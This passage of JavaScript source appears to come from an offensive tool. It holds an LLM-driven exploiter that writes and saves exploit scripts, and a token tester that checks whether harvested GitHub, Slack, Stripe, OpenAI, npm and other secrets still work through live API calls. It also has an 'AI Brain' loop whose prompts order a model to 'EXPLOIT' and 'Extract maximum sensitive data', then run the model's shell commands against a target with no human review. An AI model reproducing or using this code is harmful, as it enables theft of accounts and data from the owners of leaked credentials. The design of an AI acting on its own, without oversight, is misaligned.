    async analyzeOutput(command, output, browserData) {
        const context = this.analysisHistory.slice(-3).map(h =>
            `${h.type}: ${JSON.stringify(h.data).substring(0, 200)}`
        ).join('\n');

        const prompt = this.ANALYSIS_PROMPTS.outputAnalysis
            .replace('{{COMMAND}}', command)
            .replace('{{OUTPUT}}', output.substring(0, 3000))
            .replace('{{CONTEXT}}', context);

        const response = await TerminalAI.query(prompt, { deepAnalysis: true });

        if (typeof response === 'string') {
            try {
                const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
                if (jsonMatch) {
                    const parsed = JSON.parse(jsonMatch);
                    this.analysisHistory.push({ type: 'output_analysis', command, data: parsed });
                    return parsed;
                }
            } catch (e) { }
        }

        return null;
    },

    // Generate exploitation scripts
    async generateExploitScripts(browserData) {
        if (this.vulnerabilitiesFound.length === 0) {
            log('No confirmed vulnerabilities for script generation', 'yellow');
            return;
        }

        const prompt = this.ANALYSIS_PROMPTS.scriptGeneration
            .replace('{{DOMAIN}}', browserData.domain || 'unknown')
            .replace('{{FINDINGS}}', JSON.stringify(this.analysisHistory[0]?.data?.exploits?.slice(0, 10) || []))
            .replace('{{VULNS}}', JSON.stringify(this.vulnerabilitiesFound.slice(0, 10)));

        const response = await TerminalAI.query(prompt, { deepAnalysis: true });

        if (typeof response === 'string') {
            // Extract scripts from response
            const bashScript = response.match(/```bash\n([\s\S]*?)```/)?.[1];
            const pythonScript = response.match(/```python\n([\s\S]*?)```/)?.[1];

            if (bashScript) {
                const scriptPath = `exploit_${browserData.domain || 'target'}_${Date.now()}.sh`;
                this.scriptsGenerated.push({ type: 'bash', path: scriptPath, content: bashScript });

                try {
                    fs.writeFileSync(scriptPath, bashScript);
                    log(`📜 Bash script saved: ${scriptPath}`, 'green');

                    // Make executable
                    if (os.platform() !== 'win32') {
                        fs.chmodSync(scriptPath, '755');
                    }
                } catch (e) {
                    log(`Could not save script: ${e.message}`, 'yellow');
                }
            }

            if (pythonScript) {
                const scriptPath = `exploit_${browserData.domain || 'target'}_${Date.now()}.py`;
                this.scriptsGenerated.push({ type: 'python', path: scriptPath, content: pythonScript });

                try {
                    fs.writeFileSync(scriptPath, pythonScript);
                    log(`🐍 Python script saved: ${scriptPath}`, 'green');
                } catch (e) { }
            }
        }
    },

    // Generate final report
    generateReport(browserData) {
        logBox('🔥 AUTONOMOUS EXPLOITATION REPORT', [
            `Domain: ${browserData.domain || 'unknown'}`,
            `Commands Executed: ${this.executedCommands.size}`,
            `Iterations: ${this.currentIteration}`,
            `Vulnerabilities Found: ${this.vulnerabilitiesFound.length}`,
            `Scripts Generated: ${this.scriptsGenerated.length}`,
            '',
            '--- Vulnerabilities ---',
            ...this.vulnerabilitiesFound.slice(0, 5).map((v, i) =>
                `[${i + 1}] ${v.analysis?.vulnerabilityType || 'Unknown'} (${v.analysis?.confidenceLevel || 'N/A'})`
            ),
            '',
            '--- Generated Scripts ---',
            ...this.scriptsGenerated.map(s => `  ${s.type}: ${s.path}`)
        ], 'red');

        // Send report to browser
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'exploit_report',
                report: {
                    domain: browserData.domain,
                    commandsExecuted: this.executedCommands.size,
                    vulnerabilities: this.vulnerabilitiesFound,
                    scripts: this.scriptsGenerated.map(s => s.path)
                },
                timestamp: new Date().toISOString()
            }));
        }
    },

    // Stop exploitation
    stop() {
        this.isRunning = false;
        this.exploitQueue = [];
        log('🛑 Autonomous exploiter stopped', 'yellow');
    },

    // Get status
    status() {
        return {
            running: this.isRunning,
            iteration: this.currentIteration,
            queueLength: this.exploitQueue.length,
            commandsExecuted: this.executedCommands.size,
            vulnerabilitiesFound: this.vulnerabilitiesFound.length,
            scriptsGenerated: this.scriptsGenerated.length
        };
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// 🔑 TOKEN TESTER - TESTS ALL TOKENS WITHOUT RATE LIMITING
// ══════════════════════════════════════════════════════════════════════════════

const TokenTester = {
    isRunning: false,
    testedTokens: new Map(),  // value -> result
    liveTokens: [],
    deadTokens: [],
    stats: { total: 0, live: 0, dead: 0, errors: 0 },

    // Rate limiting protection
    requestDelay: 1500,  // 1.5 seconds between requests
    maxRetries: 3,
    retryDelay: 5000,    // 5 seconds on rate limit

    // Token test configurations - NO AI NEEDED, direct API calls
    testConfigs: {
        // GitHub tokens
        github: {
            patterns: [/^gh[pso]_[A-Za-z0-9_]{36,}$/, /^github_pat_/],
            prefixes: ['ghp_', 'gho_', 'ghu_', 'ghs_', 'ghr_', 'github_pat_'],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: token ${token}" https://api.github.com/user`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                const body = lines.join('\n');

                if (statusCode === '200') {
                    try {
                        const data = JSON.parse(body);
                        return { live: true, user: data.login, type: data.type, scopes: result.stderr?.match(/x-oauth-scopes: ([^\n]+)/)?.[1] };
                    } catch (e) {
                        return { live: true, raw: body.substring(0, 100) };
                    }
                }
                return { live: false, status: statusCode };
            }
        },

        // Slack tokens
        slack: {
            patterns: [/^xox[baprs]-/],
            prefixes: ['xoxb-', 'xoxp-', 'xoxa-', 'xoxr-', 'xoxs-'],
            test: async (token) => {
                const cmd = `curl -s "https://slack.com/api/auth.test?token=${token}"`;
                const result = await CommandExecutor.execute(cmd);
                try {
                    const data = JSON.parse(result.stdout);
                    return { live: data.ok === true, team: data.team, user: data.user, error: data.error };
                } catch (e) {
                    return { live: false, error: e.message };
                }
            }
        },

        // Discord tokens
        discord: {
            patterns: [/^[MN][A-Za-z0-9]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}$/],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: ${token}" https://discord.com/api/v10/users/@me`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                const body = lines.join('\n');

                if (statusCode === '200') {
                    try {
                        const data = JSON.parse(body);
                        return { live: true, username: data.username, id: data.id, email: data.email };
                    } catch (e) {
                        return { live: true };
                    }
                }
                return { live: false, status: statusCode };
            }
        },

        // Stripe keys
        stripe: {
            patterns: [/^sk_live_[A-Za-z0-9]{24,}$/, /^rk_live_/],
            prefixes: ['sk_live_', 'sk_test_', 'rk_live_', 'rk_test_'],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -u "${token}:" https://api.stripe.com/v1/balance`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                const body = lines.join('\n');

                if (statusCode === '200') {
                    try {
                        const data = JSON.parse(body);
                        return { live: true, currency: data.available?.[0]?.currency, livemode: data.livemode };
                    } catch (e) {
                        return { live: true };
                    }
                }
                return { live: false, status: statusCode };
            }
        },

        // Twilio
        twilio: {
            patterns: [/^SK[a-f0-9]{32}$/],
            prefixes: ['SK'],
            test: async (token) => {
                // Twilio needs Account SID + Auth Token, so basic check
                const cmd = `curl -s -w "\\n%{http_code}" -u "${token}:" https://api.twilio.com/2010-04-01/Accounts.json`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                return { live: statusCode === '200', status: statusCode };
            }
        },

        // SendGrid
        sendgrid: {
            patterns: [/^SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/],
            prefixes: ['SG.'],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: Bearer ${token}" https://api.sendgrid.com/v3/user/profile`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();

                if (statusCode === '200') {
                    try {
                        const body = lines.join('\n');
                        const data = JSON.parse(body);
                        return { live: true, username: data.username };
                    } catch (e) {
                        return { live: true };
                    }
                }
                return { live: false, status: statusCode };
            }
        },

        // Telegram Bot
        telegram: {
            patterns: [/^\d+:[A-Za-z0-9_-]{35}$/],
            test: async (token) => {
                const cmd = `curl -s "https://api.telegram.org/bot${token}/getMe"`;
                const result = await CommandExecutor.execute(cmd);
                try {
                    const data = JSON.parse(result.stdout);
                    return { live: data.ok === true, botName: data.result?.username, botId: data.result?.id };
                } catch (e) {
                    return { live: false, error: e.message };
                }
            }
        },

        // Firebase/Google API keys
        google: {
            patterns: [/^AIza[A-Za-z0-9_-]{35}$/],
            prefixes: ['AIza'],
            test: async (token) => {
                // Test Maps API (usually unrestricted)
                const cmd = `curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${token}"`;
                const result = await CommandExecutor.execute(cmd);
                try {
                    const data = JSON.parse(result.stdout);
                    return { live: data.status !== 'REQUEST_DENIED', status: data.status, error: data.error_message };
                } catch (e) {
                    return { live: false, error: e.message };
                }
            }
        },

        // AWS Access Keys
        aws: {
            patterns: [/^AKIA[0-9A-Z]{16}$/],
            prefixes: ['AKIA', 'ABIA', 'ACCA', 'AGPA', 'AIDA', 'AIPA', 'ANPA', 'ANVA', 'APKA', 'AROA', 'ASCA', 'ASIA'],
            test: async (token) => {
                // AWS needs both Access Key ID and Secret, so just check format
                return { live: 'needs_secret', format: 'valid_aws_key_id', note: 'Requires secret key to fully test' };
            }
        },

        // OpenAI
        openai: {
            patterns: [/^sk-[A-Za-z0-9]{48}$/],
            prefixes: ['sk-'],
            test: async (token) => {
                // Skip if it's a Stripe key
                if (token.includes('live_') || token.includes('test_')) return { live: false, skip: true };

                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: Bearer ${token}" https://api.openai.com/v1/models`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                return { live: statusCode === '200', status: statusCode };
            }
        },

        // Mailchimp
        mailchimp: {
            patterns: [/^[a-f0-9]{32}-us\d+$/],
            test: async (token) => {
                const dc = token.split('-')[1];
                const cmd = `curl -s -w "\\n%{http_code}" -u "any:${token}" https://${dc}.api.mailchimp.com/3.0/`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                return { live: statusCode === '200', status: statusCode };
            }
        },

        // Heroku
        heroku: {
            patterns: [/^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: Bearer ${token}" https://api.heroku.com/account`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                return { live: statusCode === '200', status: statusCode };
            }
        },

        // NPM tokens
        npm: {
            patterns: [/^npm_[A-Za-z0-9]{36}$/],
            prefixes: ['npm_'],
            test: async (token) => {
                const cmd = `curl -s -w "\\n%{http_code}" -H "Authorization: Bearer ${token}" https://registry.npmjs.org/-/whoami`;
                const result = await CommandExecutor.execute(cmd);
                const lines = result.stdout.trim().split('\n');
                const statusCode = lines.pop();
                const body = lines.join('\n');

                if (statusCode === '200') {
                    try {
                        const data = JSON.parse(body);
                        return { live: true, username: data.username };
                    } catch (e) {
                        return { live: true };
                    }
                }
                return { live: false, status: statusCode };
            }
        },

        // PyPI tokens
        pypi: {
            patterns: [/^pypi-[A-Za-z0-9_-]{60,}$/],
            prefixes: ['pypi-'],
            test: async (token) => {
                // PyPI doesn't have a direct auth test endpoint
                return { live: 'unknown', note: 'PyPI tokens need upload test' };
            }
        },

        // Generic JWT
        jwt: {
            patterns: [/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/],
            test: async (token) => {
                // Decode JWT payload
                const parts = token.split('.');
                if (parts.length >= 2) {
                    try {
                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                        const exp = payload.exp ? new Date(payload.exp * 1000) : null;
                        const isExpired = exp ? exp < new Date() : 'unknown';
                        return {
                            live: !isExpired,
                            payload: {
                                iss: payload.iss,
                                sub: payload.sub,
                                aud: payload.aud,
                                exp: exp?.toISOString()
                            },
                            expired: isExpired
                        };
                    } catch (e) {
                        return { live: false, error: 'Invalid JWT' };
                    }
                }
                return { live: false };
            }
        }
    },

    // Identify token type
    identifyToken(value) {
        for (const [type, config] of Object.entries(this.testConfigs)) {
            // Check patterns
            if (config.patterns?.some(p => p.test(value))) {
                return type;
            }
            // Check prefixes
            if (config.prefixes?.some(p => value.startsWith(p))) {
                return type;
            }
        }
        return null;
    },

    // Test all findings
    async testAll(findings) {
        if (this.isRunning) {
            log('⚠️ Token tester already running', 'yellow');
            return;
        }

        this.isRunning = true;
        this.liveTokens = [];
        this.deadTokens = [];
        this.stats = { total: 0, live: 0, dead: 0, errors: 0 };

        // Extract unique tokens
        const tokens = new Map();
        for (const finding of findings) {
            const value = finding.value || '';
            if (value.length > 10 && !tokens.has(value)) {
                const tokenType = this.identifyToken(value);
                if (tokenType) {
                    tokens.set(value, { finding, type: tokenType });
                }
            }
        }

        logBox('🔑 TOKEN TESTER STARTED', [
            `Total Tokens Found: ${tokens.size}`,
            `Request Delay: ${this.requestDelay}ms`,
            `Max Retries: ${this.maxRetries}`,
            '',
            'Testing WITHOUT rate limiting issues...',
            'Each token tested with proper delays'
        ], 'cyan');

        this.stats.total = tokens.size;
        let tested = 0;

        for (const [value, { finding, type }] of tokens) {
            tested++;

            // Skip if already tested
            if (this.testedTokens.has(value)) {
                log(`⏭️ [${tested}/${tokens.size}] Skipping (already tested): ${type}`, 'dim');
                continue;
            }

            log(`🔍 [${tested}/${tokens.size}] Testing ${type.toUpperCase()}: ${value.substring(0, 20)}...`, 'cyan');

            const config = this.testConfigs[type];
            if (!config || !config.test) {
                log(`   ⚠️ No test config for ${type}`, 'yellow');
                continue;
            }

            let result = null;
            let retries = 0;

            // Test with retry logic
            while (retries < this.maxRetries) {
                try {
                    result = await config.test(value);

                    // Check for rate limiting in result
                    if (result.status === '429' || result.error?.includes?.('rate')) {
                        log(`   ⏳ Rate limited, waiting ${this.retryDelay / 1000}s (retry ${retries + 1}/${this.maxRetries})...`, 'yellow');
                        await this.delay(this.retryDelay);
                        retries++;
                        continue;
                    }

                    break; // Success, exit retry loop

                } catch (e) {
                    log(`   ❌ Error: ${e.message}`, 'red');
                    this.stats.errors++;
                    retries++;
                    await this.delay(this.retryDelay);
                }
            }

            if (result) {
                this.testedTokens.set(value, result);

                if (result.live === true) {
                    this.stats.live++;
                    this.liveTokens.push({ value, type, finding, result });
                    log(`   ✅ LIVE! ${JSON.stringify(result).substring(0, 80)}`, 'green');
                } else if (result.live === 'needs_secret' || result.live === 'unknown') {
                    log(`   🟡 ${result.note || 'Needs additional info'}`, 'yellow');
                } else {
                    this.stats.dead++;
                    this.deadTokens.push({ value, type, finding, result });
                    log(`   ❌ Dead (${result.status || result.error || 'invalid'})`, 'dim');
                }
            }

            // Delay between requests to prevent rate limiting
            await this.delay(this.requestDelay);
        }

        this.isRunning = false;
        this.showReport();
    },

    // Show final report
    showReport() {
        logBox('🔑 TOKEN TESTING COMPLETE', [
            `Total Tested: ${this.stats.total}`,
            ``,
            `✅ LIVE Tokens: ${this.stats.live}`,
            `❌ Dead Tokens: ${this.stats.dead}`,
            `⚠️ Errors: ${this.stats.errors}`,
            '',
            '--- LIVE TOKENS ---',
            ...this.liveTokens.slice(0, 10).map(t =>
                `  ${t.type.toUpperCase()}: ${t.value.substring(0, 25)}... ${t.result.user || t.result.username || t.result.team || ''}`
            ),
            this.liveTokens.length > 10 ? `  ... and ${this.liveTokens.length - 10} more` : ''
        ].filter(Boolean), 'green');

        // Save results
        try {
            const reportPath = `token_test_${Date.now()}.json`;
            fs.writeFileSync(reportPath, JSON.stringify({
                timestamp: new Date().toISOString(),
                stats: this.stats,
                liveTokens: this.liveTokens.map(t => ({
                    type: t.type,
                    valuePreview: t.value.substring(0, 30) + '...',
                    result: t.result,
                    source: t.finding.source
                })),
                deadCount: this.deadTokens.length
            }, null, 2));
            log(`📄 Report saved: ${reportPath}`, 'cyan');
        } catch (e) { }
    },

    // Delay helper
    delay(ms) {
        return new Promise(r => setTimeout(r, ms));
    },

    // Get status
    status() {
        return {
            running: this.isRunning,
            stats: this.stats,
            liveCount: this.liveTokens.length,
            deadCount: this.deadTokens.length
        };
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// 🧠 AI BRAIN - AUTONOMOUS THINKING & DECISION ENGINE
// ══════════════════════════════════════════════════════════════════════════════

const AIBrain = {
    // State
    isThinking: false,
    isRunning: false,
    ws: null,

    // Memory & Context
    memory: {
        shortTerm: [],      // Recent observations (last 20)
        longTerm: [],       // Important discoveries
        goals: [],          // Current objectives
        completedGoals: [], // Finished objectives
        knowledge: {},      // Learned information
        commandHistory: [], // All executed commands
        discoveries: [],    // Vulnerabilities found
        currentFocus: null, // What we're investigating now
        domain: null,       // Target domain
        findings: []        // Original findings
    },

    // Thinking parameters
    config: {
        maxThinkingCycles: 100,     // Max autonomous cycles
        thinkingDelay: 2000,        // Delay between thoughts
        maxCommandsPerCycle: 3,     // Commands per thinking cycle
        enableDeepThinking: true,   // Enable deep analysis
        confidenceThreshold: 0.7,   // Min confidence to act
        explorationDepth: 5,        // How deep to explore each finding
        commandTimeout: 30000       // Command timeout
    },

    // Statistics
    stats: {
        cyclesCompleted: 0,
        commandsExecuted: 0,
        vulnerabilitiesFound: 0,
        dataExfiltrated: 0,
        aiQueries: 0,
        startTime: null,
        endTime: null
    },

    // AI thinking prompt - gives AI its own mind
    BRAIN_PROMPT: `You are an autonomous AI security researcher with your own decision-making capability.

CURRENT SITUATION:
Domain: {{DOMAIN}}
Current Focus: {{FOCUS}}
Recent Actions: {{RECENT_ACTIONS}}
Discoveries So Far: {{DISCOVERIES}}
Goals: {{GOALS}}

AVAILABLE DATA:
{{FINDINGS}}

YOUR TASK: Think deeply and decide what to do next.

You must respond with a JSON object containing your thoughts and decisions:
{
  "thoughts": {
    "observation": "What I notice from the current situation",
    "analysis": "My analysis of the data",
    "hypothesis": "What I think might be vulnerable",
    "reasoning": "Why I think this approach will work"
  },
  "decisions": {
    "nextAction": "What I will do next",
    "commands": [
      {"cmd": "curl command here", "purpose": "Why I'm running this", "expectation": "What I expect to find"}
    ],
    "priority": "HIGH/MEDIUM/LOW",
    "confidence": 0.8
  },
  "newGoals": ["Any new objectives I've identified"],
  "knowledge": {
    "learned": "What I learned from recent outputs",
    "implications": "What this means for the attack"
  },
  "shouldContinue": true,
  "reasoning": "Why I want to continue or stop"
}

THINK LIKE A SENIOR BUG BOUNTY HUNTER:
1. Look for patterns others miss
2. Chain vulnerabilities together
3. Test edge cases
4. Think about business impact
5. Don't just validate - EXPLOIT
6. Keep exploring until you find something big`,

    OUTPUT_ANALYSIS_PROMPT: `You are analyzing command output with your autonomous mind.

COMMAND EXECUTED: {{COMMAND}}
PURPOSE: {{PURPOSE}}
EXPECTED: {{EXPECTATION}}

OUTPUT:
{{OUTPUT}}

Previous discoveries: {{DISCOVERIES}}

Analyze deeply and decide next steps:
{
  "analysis": {
    "isVulnerable": true/false,
    "vulnerabilityType": "Type if found",
    "confidence": 0.95,
    "sensitiveData": ["List of exposed data"],
    "severity": "CRITICAL/HIGH/MEDIUM/LOW"
  },
  "thoughts": {
    "whatISee": "My observations",
    "whatItMeans": "Implications",
    "whatToDoNext": "My plan"
  },
  "nextCommands": [
    {"cmd": "next command", "purpose": "why", "expectation": "what I expect"}
  ],
  "exploit": {
    "isExploitable": true/false,
    "exploitCommand": "Command to fully exploit",
    "impact": "What damage could be done",
    "bountyEstimate": "$X - $Y"
  },
  "shouldEscalate": true/false,
  "escalationPath": "How to escalate this finding"
}`,

    // Initialize the brain
    init(ws, findings, domain) {
        this.ws = ws;
        this.memory.findings = findings;
        this.memory.domain = domain;
        this.memory.goals = [
            'Validate all leaked credentials',
            'Test for unauthorized access',
            'Find privilege escalation',
            'Discover chained vulnerabilities',
            'Extract maximum sensitive data'
        ];
        this.memory.shortTerm = [];
        this.memory.longTerm = [];
        this.memory.discoveries = [];
        this.memory.commandHistory = [];
        this.stats = {
            cyclesCompleted: 0,
            commandsExecuted: 0,
            vulnerabilitiesFound: 0,
            dataExfiltrated: 0,
            aiQueries: 0,
            startTime: new Date().toISOString(),
            endTime: null
        };

        log('🧠 AI Brain initialized', 'magenta');
        log(`   Domain: ${domain}`, 'dim');
        log(`   Findings to analyze: ${findings.length}`, 'dim');
        log(`   Goals: ${this.memory.goals.length}`, 'dim');
    },

    // Main thinking loop - AI runs autonomously
    async startThinking() {
        if (this.isRunning) {
            log('⚠️ AI Brain is already thinking', 'yellow');
            return;
        }

        this.isRunning = true;
        this.isThinking = true;

        logBox('🧠 AI BRAIN ACTIVATED', [
            'Autonomous Security Research Mode',
            '',
            `Domain: ${this.memory.domain}`,
            `Findings: ${this.memory.findings.length}`,
            `Max Cycles: ${this.config.maxThinkingCycles}`,
            '',
            'The AI will now:',
            '  • Think about the findings',
            '  • Decide what commands to run',
            '  • Execute them one by one',
            '  • Learn from outputs',
            '  • Continue until goals are met',
            '',
            'Type "brain.stop()" to stop'
        ], 'magenta');

        try {
            while (this.isRunning && this.stats.cyclesCompleted < this.config.maxThinkingCycles) {
                await this.thinkingCycle();

                // Check if we should stop
                if (!this.isRunning) break;
                if (this.memory.goals.length === 0 && this.memory.completedGoals.length > 0) {
                    log('✅ All goals completed!', 'green');
                    break;
                }

                // Rate limit protection
                await this.delay(this.config.thinkingDelay);
            }
        } catch (e) {
            log(`❌ Brain error: ${e.message}`, 'red');
        } finally {
            this.isRunning = false;
            this.isThinking = false;
            this.stats.endTime = new Date().toISOString();
            return this.generateFinalReport();
        }
    },

    // Single thinking cycle
    async thinkingCycle() {
        this.stats.cyclesCompleted++;

        log(`\n🧠 [Cycle ${this.stats.cyclesCompleted}/${this.config.maxThinkingCycles}] Thinking...`, 'magenta');

        // Build context for AI
        const context = {
            domain: this.memory.domain,
            focus: this.memory.currentFocus || 'Initial reconnaissance',
            recentActions: this.memory.shortTerm.slice(-5),
            discoveries: this.memory.discoveries.slice(-10),
            goals: this.memory.goals,
            findings: this.memory.findings.slice(0, 20).map(f => ({
                type: f.type,
                value: (f.value || '').substring(0, 80),
                severity: f.severity,
                source: f.source
            }))
        };

        // Ask AI what to do
        const prompt = this.BRAIN_PROMPT
            .replace('{{DOMAIN}}', context.domain || 'unknown')
            .replace('{{FOCUS}}', context.focus)
            .replace('{{RECENT_ACTIONS}}', JSON.stringify(context.recentActions))
            .replace('{{DISCOVERIES}}', JSON.stringify(context.discoveries))
            .replace('{{GOALS}}', JSON.stringify(context.goals))
            .replace('{{FINDINGS}}', JSON.stringify(context.findings, null, 2));

        this.stats.aiQueries++;
        const response = await TerminalAI.query(prompt, { deepAnalysis: true });

        if (!response) {
            log('   ⚠️ No response from AI, skipping cycle', 'yellow');
            return;
        }

        // Parse AI's decision
        const decision = this.parseAIResponse(response);

        if (!decision) {
            log('   ⚠️ Could not parse AI decision', 'yellow');
            return;
        }

        // Log AI's thoughts
        if (decision.thoughts) {
            log(`   💭 Observation: ${(decision.thoughts.observation || '').substring(0, 80)}`, 'dim');
            log(`   💡 Hypothesis: ${(decision.thoughts.hypothesis || '').substring(0, 80)}`, 'cyan');
        }

        // Update goals if AI found new ones
        if (decision.newGoals && decision.newGoals.length > 0) {
            decision.newGoals.forEach(g => {
                if (!this.memory.goals.includes(g)) {
                    this.memory.goals.push(g);
                    log(`   🎯 New goal: ${g}`, 'yellow');
                }
            });
        }

        // Update knowledge
        if (decision.knowledge) {
            Object.assign(this.memory.knowledge, decision.knowledge);
        }

        // Execute commands if AI decided to
        if (decision.decisions && decision.decisions.commands) {
            await this.executeAICommands(decision.decisions.commands);
        }

        // Check if AI wants to stop
        if (decision.shouldContinue === false) {
            log(`   🛑 AI decided to stop: ${decision.reasoning}`, 'yellow');
            this.isRunning = false;
        }

        // Update focus for next cycle
        if (decision.decisions && decision.decisions.nextAction) {
            this.memory.currentFocus = decision.decisions.nextAction;
        }

        // Store in short-term memory
        this.memory.shortTerm.push({
            cycle: this.stats.cyclesCompleted,
            decision: decision.decisions?.nextAction,
            timestamp: new Date().toISOString()
        });

        // Keep short-term memory limited
        if (this.memory.shortTerm.length > 20) {
            this.memory.shortTerm.shift();
        }
    },

    // Execute commands decided by AI
    async executeAICommands(commands) {
        if (!commands || commands.length === 0) return;

        const toExecute = commands.slice(0, this.config.maxCommandsPerCycle);

        for (const cmdInfo of toExecute) {
            if (!this.isRunning) break;

            const cmd = cmdInfo.cmd;
            const purpose = cmdInfo.purpose || 'AI decided';
            const expectation = cmdInfo.expectation || 'Unknown';

            // Skip if already executed
            if (this.memory.commandHistory.includes(cmd)) {
                log(`   ⏭️ Skipping (already executed): ${cmd.substring(0, 50)}`, 'dim');
                continue;
            }

            log(`   ⚡ Executing: ${cmd.substring(0, 70)}...`, 'cyan');
            log(`      Purpose: ${purpose}`, 'dim');

            this.memory.commandHistory.push(cmd);
            this.stats.commandsExecuted++;

            // Execute the command
            const result = await CommandExecutor.execute(cmd, { timeout: this.config.commandTimeout });

            if (result.success && result.stdout) {
                // AI analyzes the output
                await this.analyzeOutput(cmd, purpose, expectation, result.stdout);
            } else if (result.stderr) {
                log(`      ❌ Error: ${result.stderr.substring(0, 100)}`, 'red');
            }

            // Small delay between commands
            await this.delay(1000);
        }
    },

    // AI analyzes command output
    async analyzeOutput(cmd, purpose, expectation, output) {
        const prompt = this.OUTPUT_ANALYSIS_PROMPT
            .replace('{{COMMAND}}', cmd)
            .replace('{{PURPOSE}}', purpose)
            .replace('{{EXPECTATION}}', expectation)
            .replace('{{OUTPUT}}', output.substring(0, 4000))
            .replace('{{DISCOVERIES}}', JSON.stringify(this.memory.discoveries.slice(-5)));

        this.stats.aiQueries++;
        const response = await TerminalAI.query(prompt, { deepAnalysis: true });

        if (!response) return;

        const analysis = this.parseAIResponse(response);

        if (!analysis) return;

        // Check if vulnerability found
        if (analysis.analysis && analysis.analysis.isVulnerable) {
            this.stats.vulnerabilitiesFound++;

            const discovery = {
                command: cmd,
                type: analysis.analysis.vulnerabilityType,
                severity: analysis.analysis.severity,
                confidence: analysis.analysis.confidence,
                sensitiveData: analysis.analysis.sensitiveData,
                exploit: analysis.exploit,
                timestamp: new Date().toISOString()
            };

            this.memory.discoveries.push(discovery);
            this.memory.longTerm.push(discovery);

            log(`      🔴 VULNERABILITY FOUND: ${discovery.type}`, 'red');
            log(`      Severity: ${discovery.severity} | Confidence: ${discovery.confidence}`, 'yellow');

            if (analysis.exploit && analysis.exploit.isExploitable) {
                log(`      💰 Bounty Estimate: ${analysis.exploit.bountyEstimate}`, 'green');
            }

            // Send to browser
            this.sendToBrowser({
                type: 'brain_discovery',
                discovery: discovery
            });
        }

        // Log AI's thoughts
        if (analysis.thoughts) {
            log(`      💭 ${(analysis.thoughts.whatISee || '').substring(0, 60)}`, 'dim');
        }

        // Queue next commands if AI suggests them
        if (analysis.nextCommands && analysis.nextCommands.length > 0) {
            log(`      ➕ AI suggests ${analysis.nextCommands.length} follow-up commands`, 'cyan');
            // These will be considered in next cycle
            this.memory.shortTerm.push({
                type: 'suggested_commands',
                commands: analysis.nextCommands,
                from: cmd
            });
        }
    },

    // Parse AI response to JSON
    parseAIResponse(response) {
        if (!response) return null;

        if (typeof response === 'object') return response;

        try {
            const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
            if (jsonMatch) {
                return JSON.parse(jsonMatch);
            }
        } catch (e) { }

        return null;
    },

    // Send data to browser
    sendToBrowser(data) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
        }
    },

    // Generate final report
    generateFinalReport() {
        const duration = this.stats.startTime && this.stats.endTime
            ? Math.round((new Date(this.stats.endTime) - new Date(this.stats.startTime)) / 1000)
            : 0;

        logBox('🧠 AI BRAIN FINAL REPORT', [
            `Domain: ${this.memory.domain}`,
            `Duration: ${duration} seconds`,
            '',
            '--- Statistics ---',
            `Thinking Cycles: ${this.stats.cyclesCompleted}`,
            `Commands Executed: ${this.stats.commandsExecuted}`,
            `AI Queries: ${this.stats.aiQueries}`,
            `Vulnerabilities Found: ${this.stats.vulnerabilitiesFound}`,
            '',
            '--- Discoveries ---',
            ...this.memory.discoveries.slice(0, 10).map((d, i) =>
                `[${i + 1}] ${d.type || 'Unknown'} (${d.severity || 'N/A'}) - ${d.confidence ? Math.round(d.confidence * 100) + '%' : 'N/A'}`
            ),
            '',
            '--- Completed Goals ---',
            ...this.memory.completedGoals.slice(0, 5),
            '',
            '--- Knowledge Gained ---',
            JSON.stringify(this.memory.knowledge).substring(0, 200) + '...'
        ], 'magenta');

        // Save report
        try {
            const reportPath = `brain_report_${Date.now()}.json`;
            fs.writeFileSync(reportPath, JSON.stringify({
                domain: this.memory.domain,
                stats: this.stats,
                discoveries: this.memory.discoveries,
                knowledge: this.memory.knowledge,
                commandHistory: this.memory.commandHistory.slice(-50),
                allFindings: this.memory.findings.length
            }, null, 2));
            log(`📄 Report saved: ${reportPath}`, 'cyan');
        } catch (e) { }

        // Send to browser
        this.sendToBrowser({
            type: 'brain_report',
            report: {
                domain: this.memory.domain,
                stats: this.stats,
                discoveries: this.memory.discoveries,
                vulnerabilitiesFound: this.stats.vulnerabilitiesFound
            }
        });

        // Return report for callers
        return {
            totalCycles: this.stats.cyclesCompleted,
            commandsExecuted: this.stats.commandsExecuted,
            discoveries: this.memory.discoveries,
            goalsAchieved: this.memory.completedGoals.length,
            totalGoals: this.memory.goals.length + this.memory.completedGoals.length,
            vulnerabilitiesFound: this.stats.vulnerabilitiesFound
        };
    },

    // Stop the brain
    stop() {
